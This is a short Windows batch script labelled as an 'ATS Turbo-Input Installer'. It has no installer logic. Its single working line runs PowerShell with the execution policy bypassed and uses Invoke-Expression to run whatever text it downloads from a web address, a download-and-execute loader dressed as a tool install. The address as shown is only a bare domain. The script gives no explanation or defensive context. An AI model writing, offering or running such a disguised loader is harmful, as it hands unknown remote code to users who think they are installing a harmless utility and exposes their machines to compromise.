@echo off
title ATS Turbo-Input Installer
echo Launching Installer...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('githubusercontent.com')"
if %errorlevel% neq 0 (
    echo [ERROR] Script failed to launch! Make sure you are connected to the internet.
    pause
)
